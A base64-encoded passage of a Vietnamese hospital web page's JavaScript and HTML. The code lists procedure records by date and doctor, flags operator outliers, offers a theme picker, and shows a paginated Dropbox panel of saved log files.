0KICAgIGlmKGhhc01ham9yaXR5ICYmIGgub3BOb3JtICE9PSBtLnRvcE5vcm0pew0KICAgICAgZGF0ZXMuYWRkKGguZGF0ZSk7DQogICAgfQ0KICB9KTsNCg0KICByZXR1cm4gQXJyYXkuZnJvbShkYXRlcyk7DQp9DQoNCndpbmRvdy5yZW5kZXJIZXJiTGlzdCA9IGZ1bmN0aW9uKCl7DQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJUYWJsZUJvZHknKTsNCiAgY29uc3QgZGF0ZUZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICBjb25zdCBkb2N0b3JGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRvY3RvckZpbHRlcicpOw0KICBjb25zdCBzdW1tYXJ5RGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyU3VtbWFyeScpOw0KICBjb25zdCBtb2RhbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsJyk7DQogIGNvbnN0IG1vZGFsQm9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsQm9keScpOw0KICBjb25zdCBtb2RhbEluZm8gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbEluZm8nKTsNCiAgY29uc3Qgb25seUVycm9yRGF5c0NiID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dIZXJiRXJyb3JEYXlzQ2hlY2tib3gnKTsNCg0KICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCg0KICBjb25zdCBoZXJic1JhdyA9IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyB8fCBbXTsNCiAgbGV0IGhlcmJzID0gaGVyYnNSYXcubWFwKGg9Pih7DQogICAgLi4uaCwNCiAgICBvcENsZWFuOiBjbGVhbkRpc3BsYXkoaC5vcGVyYXRvciksDQogICAgb3BOb3JtOiBub3JtKGgub3BlcmF0b3IpDQogIH0pKTsNCg0KICAvLyBu4bq/dSBjaGVja2JveCBi4bqtdCB0aMOsIGzhu41jIGzhuqFpIGhlcmJzIGNo4buJIGPDsm4gbmjhu69uZyBuZ8OgeSBjw7MgbOG7l2kNCiAgaWYob25seUVycm9yRGF5c0NiICYmIG9ubHlFcnJvckRheXNDYi5jaGVja2VkKXsNCiAgICBjb25zdCBlcnJvckRhdGVzID0gZ2V0SGVyYkVycm9yRGF0ZXMoaGVyYnMpOw0KICAgIGhlcmJzID0gaGVyYnMuZmlsdGVyKGggPT4gZXJyb3JEYXRlcy5pbmNsdWRlcyhoLmRhdGUpKTsNCiAgICBpZihzdW1tYXJ5RGl2KXsNCiAgICAgIGlmKGVycm9yRGF0ZXMubGVuZ3RoKXsNCiAgICAgICAgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUwgPSBgPGI+xJBhbmcgaGnhu4NuIHRo4buLIGPDoWMgbmfDoHkgY8OzIGzhu5dpIHPhuq9jIHRodeG7kWM6PC9iPiAke2Vycm9yRGF0ZXMuam9pbignLCAnKX1gOw0KICAgICAgfSBlbHNlIHsNCiAgICAgICAgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTCA9ICcnOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIC8vIGto4bufaSB04bqhbyBzZWxlY3QgbuG6v3UgY2jGsGENCiAgaWYoIWRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCl7DQogICAgY29uc3QgdW5pcXVlRGF0ZXMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaD0+aC5kYXRlKSldLnNvcnQoKGEsYik9PnsNCiAgICAgIGNvbnN0IFtkYSxtYSx5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICBjb25zdCBbZGIsbWIseWJdID0gYi5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLG1hLTEsZGEpIC0gbmV3IERhdGUoeWIsbWItMSxkYik7DQogICAgfSk7DQogICAgY29uc3QgdW5pcXVlRG9jdG9ycyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoPT5oLmRvY3Rvcnx8J0tow7RuZyBjw7MnKSldLnNvcnQoKTsNCiAgICBkYXRlRmlsdGVyLmlubmVySFRNTCA9DQogICAgICAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICB1bmlxdWVEYXRlcy5tYXAoZD0+YDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICBkb2N0b3JGaWx0ZXIuaW5uZXJIVE1MID0NCiAgICAgICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4nICsNCiAgICAgIHVuaXF1ZURvY3RvcnMubWFwKGQ9PmA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkID0gJ3RydWUnOw0KICAgIGRhdGVGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgd2luZG93LnJlbmRlckhlcmJMaXN0KTsNCiAgICBkb2N0b3JGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgd2luZG93LnJlbmRlckhlcmJMaXN0KTsNCiAgICBpZihvbmx5RXJyb3JEYXlzQ2Ipew0KICAgICAgb25seUVycm9yRGF5c0NiLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCk7DQogICAgfQ0KICB9DQoNCiAgY29uc3Qgc2VsZWN0ZWREYXRlID0gZGF0ZUZpbHRlci52YWx1ZTsNCiAgY29uc3Qgc2VsZWN0ZWREb2N0b3IgPSBkb2N0b3JGaWx0ZXIudmFsdWU7DQoNCiAgY29uc3QgZmlsdGVyZWQgPSBoZXJicy5maWx0ZXIocCA9Pg0KICAgIChzZWxlY3RlZERhdGUgPT09ICdhbGwnIHx8IHAuZGF0ZSA9PT0gc2VsZWN0ZWREYXRlKSAmJg0KICAgIChzZWxlY3RlZERvY3RvciA9PT0gJ2FsbCcgfHwgcC5kb2N0b3IgPT09IHNlbGVjdGVkRG9jdG9yKQ0KICApOw0KDQogIGlmKGZpbHRlcmVkLmxlbmd0aCA9PT0gMCl7DQogICAgY29uc3QgdHIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgIHRyLmNsYXNzTmFtZSA9ICdoZXJiLXJvdyc7DQogICAgdHIuaW5uZXJIVE1MID0gJzx0ZCBjb2xzcGFuPSI1Ij48Y2VudGVyPktow7RuZyBjw7MgZOG7ryBsaeG7h3Ugc+G6r2MgdGh14buRYyB0aGFuZzwvY2VudGVyPjwvdGQ+JzsNCiAgICB0Ym9keS5hcHBlbmRDaGlsZCh0cik7DQogICAgaWYoc3VtbWFyeURpdikgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgICByZXR1cm47DQogIH0NCg0KICBjb25zdCBtYWpvcml0eSA9IGNvbXB1dGVNYWpvcml0eUJ5RGF0ZShoZXJicyk7DQogIGNvbnN0IG91dGxpZXJzSW5WaWV3ID0gW107DQoNCiAgZmlsdGVyZWQuZm9yRWFjaChwPT57DQogICAgY29uc3QgdHIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgIHRyLmNsYXNzTmFtZSA9ICdoZXJiLXJvdyc7DQogICAgY29uc3QgbSA9IG1ham9yaXR5W3AuZGF0ZV07DQogICAgY29uc3QgaGFzTWFqb3JpdHkgPSBtICYmIG0udG9wTm9ybSAmJiBtLnRvcENvdW50ID4gbS5zZWNvbmRDb3VudDsNCiAgICBpZihoYXNNYWpvcml0eSAmJiBwLm9wTm9ybSAhPT0gbS50b3BOb3JtKXsNCiAgICAgIHRyLmNsYXNzTGlzdC5hZGQoJ2hlcmItb3V0bGllcicpOw0KICAgICAgb3V0bGllcnNJblZpZXcucHVzaChwKTsNCiAgICB9DQogICAgdHIuaW5uZXJIVE1MID0gYA0KICAgICAgPHRkPiR7cC5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7cC5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke3AucGF0aWVudElkfTwvdGQ+DQogICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgPHRkPiR7cC5kYXRlfTwvdGQ+DQogICAgICA8dGQ+JHtwLmRpc3BsYXlTdGFydH0gJnJhcnI7ICR7cC5kaXNwbGF5RW5kfTwvdGQ+DQogICAgICA8dGQ+JHtwLm9wQ2xlYW59PC90ZD4NCiAgICBgOw0KICAgIHRib2R5LmFwcGVuZENoaWxkKHRyKTsNCiAgfSk7DQoNCiAgaWYoc3VtbWFyeURpdiAmJiAoIW9ubHlFcnJvckRheXNDYiB8fCAhb25seUVycm9yRGF5c0NiLmNoZWNrZWQpKXsNCiAgICBpZihvdXRsaWVyc0luVmlldy5sZW5ndGgpew0KICAgICAgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5PSdibG9jayc7DQogICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTCA9DQogICAgICAgIGA8YSBocmVmPSIjIiBpZD0iaGVyYk91dGxpZXJDb3VudExpbmsiPkPDsyAke291dGxpZXJzSW5WaWV3Lmxlbmd0aH0gY2EgY8OzIHbhuqVuIMSR4buBIHRyb25nIGRhbmggc8OhY2ggbsOgeS48L2E+YDsNCiAgICAgIGNvbnN0IGxpbmsgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJDb3VudExpbmsnKTsNCiAgICAgIGxpbmsuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbihldil7DQogICAgICAgIGV2LnByZXZlbnREZWZhdWx0KCk7DQogICAgICAgIGlmKG1vZGFsQm9keSl7DQogICAgICAgICAgbW9kYWxCb2R5LmlubmVySFRNTCA9ICcnOw0KICAgICAgICAgIG91dGxpZXJzSW5WaWV3LmZvckVhY2gocD0+ew0KICAgICAgICAgICAgY29uc3QgdHIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICAgICAgdHIuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgICA8dGQ+JHtwLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7cC5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgICAgPHRkPiR7cC5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgICAgPHRkPiR7cC5kYXRlfTwvdGQ+DQogICAgICAgICAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSAmcmFycjsgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgICAgICAgICAgPHRkPiR7cC5vcENsZWFufTwvdGQ+DQogICAgICAgICAgICBgOw0KICAgICAgICAgICAgbW9kYWxCb2R5LmFwcGVuZENoaWxkKHRyKTsNCiAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KICAgICAgICBpZihtb2RhbEluZm8pew0KICAgICAgICAgIGNvbnN0IG5vdGVEYXRlID0gKHNlbGVjdGVkRGF0ZT09PSdhbGwnKSA/ICduaGnhu4F1IG5nw6B5JyA6IHNlbGVjdGVkRGF0ZTsNCiAgICAgICAgICBtb2RhbEluZm8udGV4dENvbnRlbnQgPSBgVOG7lW5nICR7b3V0bGllcnNJblZpZXcubGVuZ3RofSBjYSBraMOhYyDEkWEgc+G7kSAoJHtub3RlRGF0ZX0pLmA7DQogICAgICAgIH0NCiAgICAgICAgaWYobW9kYWwpIG1vZGFsLnN0eWxlLmRpc3BsYXk9J2Jsb2NrJzsNCiAgICAgIH0sIHtvbmNlOnRydWV9KTsNCiAgICB9IGVsc2Ugew0KICAgICAgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MPScnOw0KICAgIH0NCiAgfQ0KfTsNCg0KDQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKT0+ew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJQcm9jZWR1cmVUYWJsZScpOw0KICAgIGlmKHRhYmxlICYmIHRhYmxlLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJyl7DQogICAgICB3aW5kb3cucmVuZGVySGVyYkxpc3QoKTsNCiAgICB9DQogIH0pOw0KfSkoKTsNCg0KDQoNCg0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24gKCkgew0KICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCiAgICBjb25zdCBhbmFseXplQnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKTsNCiAgICBpZiAoZmlsZUlucHV0ICYmIGFuYWx5emVCdG4pIHsNCiAgICAgIGZpbGVJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAgICAgIGFuYWx5emVCdG4uY2xpY2soKTsNCiAgICAgIH0pOw0KICAgIH0NCiAgfSk7DQo8L3NjcmlwdD4NCg0KDQo8IS0tIFRIRU1FIFBJQ0tFUiBTQ1JJUFQgLS0+DQo8c2NyaXB0Pg0KKGZ1bmN0aW9uKCl7DQogIGNvbnN0IFRIRU1FX0tFWSA9ICd1aUFjY2VudFRoZW1lJzsNCiAgY29uc3QgYm9keSA9IGRvY3VtZW50LmJvZHk7DQogIGNvbnN0IHBpY2tlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aGVtZVBpY2tlcicpOw0KICBpZighcGlja2VyKSByZXR1cm47DQogIGZ1bmN0aW9uIGFwcGx5VGhlbWUodCl7DQogICAgYm9keS5jbGFzc0xpc3QucmVtb3ZlKCd0aGVtZS1kZWZhdWx0JywndGhlbWUtb3JhbmdlJywndGhlbWUtcmVkJywndGhlbWUtZ3JlZW4nKTsNCiAgICBpZih0ICYmIHQgIT09ICdkZWZhdWx0Jyl7DQogICAgICBib2R5LmNsYXNzTGlzdC5hZGQoJ3RoZW1lLScrdCk7DQogICAgfSBlbHNlIHsNCiAgICAgIGJvZHkuY2xhc3NMaXN0LmFkZCgndGhlbWUtZGVmYXVsdCcpOyAvLyBleHBsaWNpdCDEkeG7gyBhY3RpdmUgcmluZw0KICAgIH0NCiAgICBwaWNrZXIucXVlcnlTZWxlY3RvckFsbCgnLnRoZW1lLXN3YXRjaCcpLmZvckVhY2goYnRuPT57DQogICAgICBidG4uY2xhc3NMaXN0LnRvZ2dsZSgnaXMtYWN0aXZlJywgYnRuLmRhdGFzZXQudGhlbWU9PT10IHx8ICh0PT09JycgJiYgYnRuLmRhdGFzZXQudGhlbWU9PT0nZGVmYXVsdCcpKTsNCiAgICB9KTsNCiAgICB0cnl7IGxvY2FsU3RvcmFnZS5zZXRJdGVtKFRIRU1FX0tFWSx0fHwnZGVmYXVsdCcpOyB9Y2F0Y2goZSl7fQ0KICB9DQogIGNvbnN0IHNhdmVkID0gKGZ1bmN0aW9uKCl7dHJ5e3JldHVybiBsb2NhbFN0b3JhZ2UuZ2V0SXRlbShUSEVNRV9LRVkpIHx8ICdkZWZhdWx0Jzt9Y2F0Y2goZSl7cmV0dXJuICdkZWZhdWx0Jzt9fSkoKTsNCiAgYXBwbHlUaGVtZShzYXZlZCk7DQogIHBpY2tlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZT0+ew0KICAgIGNvbnN0IGJ0biA9IGUudGFyZ2V0LmNsb3Nlc3QoJy50aGVtZS1zd2F0Y2gnKTsNCiAgICBpZighYnRuKSByZXR1cm47DQogICAgYXBwbHlUaGVtZShidG4uZGF0YXNldC50aGVtZSk7DQogIH0pOw0KfSkoKTsNCjwvc2NyaXB0Pg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gdXBkYXRlSGVyYkJ1dHRvbldpdGhPdXRsaWVyQ291bnQoKSB7DQogIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVG9nZ2xlQnRuJyk7DQogIGlmICghYnRuIHx8ICF3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMpIHJldHVybjsNCg0KICBjb25zdCBoZXJicyA9IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlczsNCiAgY29uc3QgY291bnRzID0ge307DQoNCiAgaGVyYnMuZm9yRWFjaChoID0+IHsNCiAgICBjb25zdCBkYXRlID0gaC5kYXRlOw0KICAgIGNvbnN0IGtleSA9IGRhdGU7DQogICAgaWYgKCFjb3VudHNba2V5XSkgY291bnRzW2tleV0gPSB7fTsNCiAgICBjb25zdCBuYW1lID0gKGgub3BlcmF0b3IgfHwgJ0tow7RuZyBjw7MnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCiAgICBjb3VudHNba2V5XVtuYW1lXSA9IChjb3VudHNba2V5XVtuYW1lXSB8fCAwKSArIDE7DQogIH0pOw0KDQogIGxldCBvdXRsaWVyQ291bnQgPSAwOw0KDQogIE9iamVjdC5rZXlzKGNvdW50cykuZm9yRWFjaChkYXRlID0+IHsNCiAgICBjb25zdCBvcHMgPSBjb3VudHNbZGF0ZV07DQogICAgY29uc3QgZW50cmllcyA9IE9iamVjdC5lbnRyaWVzKG9wcykuc29ydCgoYSwgYikgPT4gYlsxXSAtIGFbMV0pOw0KICAgIGNvbnN0IHRvcCA9IGVudHJpZXNbMF07DQogICAgaWYgKCF0b3ApIHJldHVybjsNCg0KICAgIGNvbnN0IHRvcE5hbWUgPSB0b3BbMF07DQogICAgY29uc3QgdG9wQ291bnQgPSB0b3BbMV07DQoNCiAgICBmb3IgKGNvbnN0IFtuYW1lLCBjb3VudF0gb2YgZW50cmllcykgew0KICAgICAgaWYgKG5hbWUgIT09IHRvcE5hbWUgJiYgY291bnQgPiAwKSB7DQogICAgICAgIG91dGxpZXJDb3VudCArPSBjb3VudDsNCiAgICAgIH0NCiAgICB9DQogIH0pOw0KDQpidG4uaW5uZXJIVE1MID0gYFPhuq9jIHRodeG7kWMgdGhhbmcgPGkgY2xhc3M9ImZhLXNvbGlkIGZhLXRyaWFuZ2xlLWV4Y2xhbWF0aW9uIiBzdHlsZT0iY29sb3I6eWVsbG93Ij48L2k+IDxzcGFuIHN0eWxlPSJjb2xvcjp5ZWxsb3c7IGZvbnQtd2VpZ2h0OmJvbGQiPigke291dGxpZXJDb3VudH0pPC9zcGFuPmA7DQoNCg0KfQ0KPC9zY3JpcHQ+DQo8ZGl2IGlkPSJkcm9wYm94UGFuZWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7IHBvc2l0aW9uOmZpeGVkOyBpbnNldDowOyBiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTsgei1pbmRleDo5OTk5OyI+DQogIDxkaXYgY2xhc3M9InNhY3RodW9jdGhhbmciPg0KICAgPGRpdiBzdHlsZT0iZGlzcGxheTogZmxleDsganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuOyBhbGlnbi1pdGVtczogY2VudGVyOyI+DQogIDxoMz7wn5OCIERhbmggc8OhY2ggS2hvYSDEkcOjIHPhu60gZOG7pW5nIHBo4bqnbiBt4buBbTwvaDM+DQogIDxidXR0b24gY2xhc3M9ImJ0biJvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhbmVsJykuc3R5bGUuZGlzcGxheT0nbm9uZScic3R5bGU9InBhZGRpbmc6OHB4IDE0cHg7IGZvbnQtc2l6ZToxM3B4OyBib3JkZXItcmFkaXVzOjRweDsiPg0KICAgIMSQw7NuZw0KICA8L2J1dHRvbj4NCjwvZGl2Pg0KPCEtLSBQYWdpbmF0aW9uIGNvbnRyb2xzIC0tPg0KPGRpdiBpZD0iZHJvcGJveFBhZ2VyIiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6OHB4O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO21hcmdpbi10b3A6MTJweCI+DQogIDxkaXY+DQogICAgSGnhu4NuIHRo4buLDQogICAgPHNlbGVjdCBpZD0iZHJvcGJveFBhZ2VTaXplIiBzdHlsZT0icGFkZGluZzo2cHggOHB4O2JvcmRlcjoxcHggc29saWQgI2RkZDtib3JkZXItcmFkaXVzOjZweCI+DQogICAgICA8b3B0aW9uIHZhbHVlPSIxMCIgc2VsZWN0ZWQ+MTA8L29wdGlvbj4NCiAgICAgIDxvcHRpb24gdmFsdWU9IjIwIj4yMDwvb3B0aW9uPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iNTAiPjUwPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogICAgZMOybmcgLyB0cmFuZw0KICA8L2Rpdj4NCg0KICA8ZGl2IGlkPSJkcm9wYm94UGFnZUJ1dHRvbnMiIHN0eWxlPSJkaXNwbGF5OmZsZXg7Z2FwOjZweDtmbGV4LXdyYXA6d3JhcCI+PC9kaXY+DQoNCiAgPGRpdiBpZD0iZHJvcGJveFBhZ2VJbmZvIiBzdHlsZT0ibWluLXdpZHRoOjE3MHB4O3RleHQtYWxpZ246cmlnaHQiPjwvZGl2Pg0KPC9kaXY+DQogICAgPHRhYmxlIGJvcmRlcj0iMSIgY2VsbHBhZGRpbmc9IjgiIHN0eWxlPSJ3aWR0aDoxMDAlOyBib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7IGZvbnQtc2l6ZToxNHB4Ij4NCiAgICAgIDx0aGVhZD4NCiAgICAgICAgPHRyPg0KICAgICAgICAgIDx0aD5TVFQ8L3RoPg0KICAgICAgICAgIDx0aD5Uw6puIGtob2E8L3RoPg0KICAgICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgICAgPHRoPlPhuq9jIHRodeG7kWM8L3RoPg0KICAgICAgICAgPHRoPlNhaSB0aOG7nWkgZ2lhbjwvdGg+DQogICAgICAgPHRoPlRyw7luZyBnaeG7nTwvdGg+DQogICAgICAgDQogICAgICAgICAgPHRoPlRo4budaSBnaWFuPC90aD4NCgkJICA8dGg+TGluazwvdGg+DQoJCSAgPHRoPlhvw6E8L3RoPg0KICAgICAgICA8L3RyPg0KICAgICAgPC90aGVhZD4NCiAgICAgIDx0Ym9keSBpZD0iZHJvcGJveEZpbGVMaXN0Ij48L3Rib2R5Pg0KICAgIDwvdGFibGU+DQogIA0KICA8L2Rpdj4NCjwvZGl2PjxzY3JpcHQ+DQphc3luYyBmdW5jdGlvbiBzaG93RHJvcGJveFBhbmVsKCkgew0KYXdhaXQgZW5zdXJlRHJvcGJveCgpOyAvLyDEkeG6o20gYuG6o28gY8OzIERyb3Bib3ggU0RLDQoNCiAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hGaWxlTGlzdCcpOw0KDQogIC8vIEhp4buHbiBwb3B1cCBuZ2F5IGzhuq1wIHThu6ljIHbhu5tpIHRy4bqhbmcgdGjDoWkgbG9hZGluZw0KICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI5IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOmJsdWU7Ij4NCiAgICDEkGFuZyB04bqjaSBk4buvIGxp4buHdS4uLg0KICA8L3RkPjwvdHI+YDsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYW5lbCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KDQogIHRyeSB7DQogICAgLy8gMSkgS2nhu4NtIHRyYSB04buTbiB04bqhaSBsb2cuanNvbg0KICAgIGxldCBoYXNMb2cgPSBmYWxzZTsNCiAgICBsZXQgcmVzID0gYXdhaXQgZGJ4LmZpbGVzTGlzdEZvbGRlcih7IHBhdGg6ICcvdGh1dGh1YXQnIH0pOw0KICAgIHdoaWxlICh0cnVlKSB7DQogICAgICBpZiAocmVzLnJlc3VsdD8uZW50cmllcz8uc29tZShlID0+IGVbJy50YWcnXSA9PT0gJ2ZpbGUnICYmIGUubmFtZSA9PT0gJ2xvZy5qc29uJykpIHsNCiAgICAgICAgaGFzTG9nID0gdHJ1ZTsNCiAgICAgICAgYnJlYWs7DQogICAgICB9DQogICAgICBpZiAoIXJlcy5yZXN1bHQ/Lmhhc19tb3JlKSBicmVhazsNCiAgICAgIHJlcyA9IGF3YWl0IGRieC5maWxlc0xpc3RGb2xkZXJDb250aW51ZSh7IGN1cnNvcjogcmVzLnJlc3VsdC5jdXJzb3IgfSk7DQogICAgfQ0KDQogICAgLy8gMikgTuG6v3Uga2jDtG5nIGPDsyBmaWxlIOKGkiBj4bqtcCBuaOG6rXQgbuG7mWkgZHVuZw0KICAgIGlmICghaGFzTG9nKSB7DQogICAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgICBLaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1DQogICAgICA8L3RkPjwvdHI+YDsNCiAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyAzKSBDw7MgZmlsZSDihpIgdOG6o2kgdsOgIGhp4buDbiB0aOG7iw0KICAgIGNvbnN0IGRsID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiAnL3RodXRodWF0L2xvZy5qc29uJyB9KTsNCiAgICBjb25zdCB0ZXh0ID0gYXdhaXQgZGwucmVzdWx0LmZpbGVCbG9iLnRleHQoKTsNCiAgICBsZXQgbG9ncyA9IFtdOw0KICAgIHRyeSB7IGxvZ3MgPSBKU09OLnBhcnNlKHRleHQpOyB9IGNhdGNoIHsgbG9ncyA9IFtdOyB9DQoNCiAgICBpZiAoIWxvZ3MubGVuZ3RoKSB7DQogICAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgICBLaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1DQogICAgICA8L3RkPjwvdHI+YDsNCiAgICB9IGVsc2Ugew0KIGNvbnN0IGN1cnJlbnRVc2VyID0gKHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSB8fCAnJykudG9Mb3dlckNhc2UoKTsNCg0KLy8gUmVuZGVyIG3hu5tpIOKAkyBnaWFvIGNobyBi4buZIHBow6JuIHRyYW5nOg0KREJfTE9HUyA9IGxvZ3M7IC8vIG3huqNuZyBk4buvIGxp4buHdSDEkeG6p3kgxJHhu6cNCkRCX1BBR0UgPSAxOyAgICAvLyB24buBIHRyYW5nIDEgbeG7l2kga2hpIG3hu58gcGFuZWwNCkRCX0NVUlJFTlRfVVNFUiA9IChzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJykgfHwgJycpLnRvTG93ZXJDYXNlKCk7DQoNCmF0dGFjaFBhZ2VyRXZlbnRzT25jZSgpOyAvLyBn4bqvbiBjaGFuZ2UgY2hvIHNlbGVjdCBwYWdlIHNpemUgKGNo4buJIDEgbOG6p24pDQpyZW5kZXJEcm9wYm94UGFnZSgpOyAgICAgLy8gduG6vSB0Ym9keSArIG7DunQgdHJhbmcgdOG7qyBEQl9MT0dTDQogICAgfQ0KICB9IGNhdGNoIChlcnIpIHsNCiAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHhu41jIGRhbmggc8OhY2ggdOG7qyBEcm9wYm94OicsIGVycik7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gYDx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyBjb2xvcjpyZWQ7Ij4NCiAgICAgIEtow7RuZyB0aOG7gyB04bqjaSBk4buvIGxp4buHdQ0KICAgIDwvdGQ+PC90cj5gOw0KICB9DQp9DQooZnVuY3Rpb24oKXsNCiAgY29uc3QgcGFnZX